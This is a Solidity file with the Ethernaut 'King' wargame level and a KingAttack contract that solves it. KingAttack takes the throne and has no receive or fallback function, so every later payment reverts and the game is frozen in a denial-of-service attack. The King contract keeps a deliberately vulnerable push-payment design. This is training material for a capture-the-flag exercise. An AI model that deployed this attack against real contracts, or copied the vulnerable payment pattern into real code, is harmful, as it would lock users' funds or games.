// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/**
 * @title King (Ethernaut Level 9)
 * @notice The contract below represents a very simple game: whoever sends it an amount of ether
 *         that is larger than the current prize becomes the new king. On such an event, the
 *         overthrown king gets paid the new prize, making a bit of ether in the process!
 *         The goal is to break the game by becoming the king and preventing anyone else from
 *         claiming the throne.
 */
contract King {
    address public king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner, "Not enough ether");
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

/**
 * @title KingAttack
 * @notice Attack contract that becomes king and prevents anyone else from reclaiming.
 *         By not implementing a receive/fallback function, the transfer to this contract
 *         will always revert, breaking the game.
 */
contract KingAttack {
    constructor(address _king) payable {
        // Send ether to become king
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    // No receive() or fallback() — any transfer to this contract will revert
}
